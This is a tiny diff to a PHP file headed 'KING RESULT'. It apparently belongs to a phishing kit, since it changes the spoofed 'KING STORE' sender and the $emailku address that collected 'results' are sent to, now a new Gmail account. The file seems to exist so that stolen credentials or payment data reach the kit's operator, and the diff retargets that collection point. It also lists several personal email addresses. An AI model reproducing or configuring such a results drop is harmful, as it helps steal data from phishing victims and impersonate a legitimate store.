@@ -1,6 +1,6 @@
 <?php
 // KING RESULT
-$sender = 'From: KING STORE <iamkingop193@gmail.com>';
+$sender = 'From: KING STORE <gurubhi42@gmail.com>';
 
-$emailku = 'de3pansh.singh@yandex.com'; // 
+$emailku = 'gurubhi42@gmail.com'; // 
 ?>
